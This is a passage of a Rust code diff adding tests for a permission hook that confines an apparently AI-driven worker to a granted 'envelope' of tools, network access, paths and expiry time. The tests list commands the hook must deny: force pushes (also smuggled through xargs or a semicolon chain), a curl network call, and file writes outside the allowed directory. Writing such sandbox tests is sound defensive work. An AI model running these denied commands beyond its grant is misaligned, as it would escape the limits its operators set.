+                    outcome.matched.unwrap().pattern,
+                    "<envelope: network not granted>"
+                );
+            }
+            assert_eq!(check(&envelope, "echo allowed").verdict, Verdict::Allow);
+        }
+        envelope.expires_at = 1;
+        let outcome = check(&envelope, "echo allowed");
+        assert_eq!(outcome.verdict, Verdict::Deny);
+        assert_eq!(outcome.matched.unwrap().pattern, "<envelope: expired>");
+        for expires_at in [2, 3, u64::MAX] {
+            envelope.expires_at = expires_at;
+            assert_eq!(check(&envelope, "echo allowed").verdict, Verdict::Allow);
+        }
+        for command in [
+            "git push --force",
+            "xargs git push --force",
+            "echo x; git push --force",
+        ] {
+            assert_eq!(
+                check(&envelope, command).verdict,
+                Verdict::Deny,
+                "{command}"
+            );
+        }
+    }
+
+    #[test]
+    fn the_hook_enforces_the_reviewed_envelope_table_and_allows_granted_commands() {
+        let repo = tempfile::tempdir().unwrap();
+        let home = tempfile::tempdir().unwrap();
+        let _home = super::super::testenv::HomeGuard::set(home.path());
+        let cfg = CtxConfig::load(repo.path(), &|_| None).unwrap();
+        let mut envelope = safety_test_envelope();
+        envelope.tools = envelope::ToolSet::none();
+        envelope.network = false;
+        envelope.expires_at = 1;
+        let check = |envelope: &envelope::WorkerEnvelope, command, mode| {
+            let raw = serde_json::to_string(envelope).unwrap();
+            let env = |key: &str| (key == super::super::agent::ENVELOPE_ENV).then(|| raw.clone());
+            let stdin = serde_json::json!({"tool_name":"Bash", "tool_input":{"command":command},
+                "cwd":"/w", "permission_mode":mode, "session_id":"t"})
+            .to_string();
+            let mut out = Vec::new();
+            assert_eq!(
+                run_check_hook_mode_with_env(&cfg, &mut out, &stdin, &env).unwrap(),
+                0
+            );
+            serde_json::from_slice::<serde_json::Value>(&out).unwrap()["hookSpecificOutput"]["permissionDecision"].as_str().unwrap().to_string()
+        };
+        for command in [
+            "curl https://example.invalid",
+            "echo allowed",
+            "echo blocked > outside.txt",
+            "cp input.txt outside.txt",
+            "touch outside.txt",
+            "echo blocked > /allowed/out.txt",
+        ] {
+            assert_eq!(check(&envelope, command, "dontAsk"), "deny", "{command}");
+        }
+        envelope.tools.shell = true;
+        envelope.expires_at = u64::MAX;
+        assert_eq!(check(&envelope, "echo allowed", "default"), "allow");
+        envelope.network = true;
+        envelope.tools.network = true;
+        for command in ["echo x > allowed/out.txt", "cp a allowed/b"] {
+            assert_eq!(check(&envelope, command, "default"), "allow", "{command}");
+        }
+        for command in [
+            "cp a outside.txt",
+            "touch outside.txt",
+            "echo x > /allowed/out.txt",
+        ] {
+            assert_eq!(check(&envelope, command, "default"), "deny", "{command}");
+        }
+    }
+
+    #[test]
+    fn argv_check_applies_the_same_envelope_as_explain() {
+        let repo = tempfile::tempdir().expect("tempdir");
+        let home = tempfile::tempdir().expect("tempdir");
+        let _home = super::super::testenv::HomeGuard::set(home.path());
+        let mut envelope = envelope::WorkerEnvelope::locked();
+        envelope.paths = vec![envelope::PathScope::new("allowed")];
+        envelope.tools = envelope::ToolSet::all();
+        envelope.expires_at = u64::MAX;
+        let raw = serde_json::to_string(&envelope).unwrap();
+        let env = |key: &str| (key == super::super::agent::ENVELOPE_ENV).then(|| raw.clone());
+        let args = CheckArgs {
+            repo: repo.path().to_path_buf(),
+            mode: LaunchMode::Interactive,
+            command: vec!["echo blocked > outside.txt".into()],
+        };
+        let mut out = Vec::new();
+        assert_eq!(run_check(&args, &mut out, &env).unwrap(), 2);
+        assert!(String::from_utf8(out).unwrap().contains("<envelope:"));
+        let args = ExplainArgs {
+            repo: args.repo,
+            mode: args.mode,
+            command: args.command,
+        };
+        let mut out = Vec::new();
+        run_explain(&args, &mut out, &env).unwrap();
+        assert!(String::from_utf8(out).unwrap().contains("<envelope:"));
     }
 
     /// `run_check`'s hook-mode branch delegates to `HookToolPayload::parse`
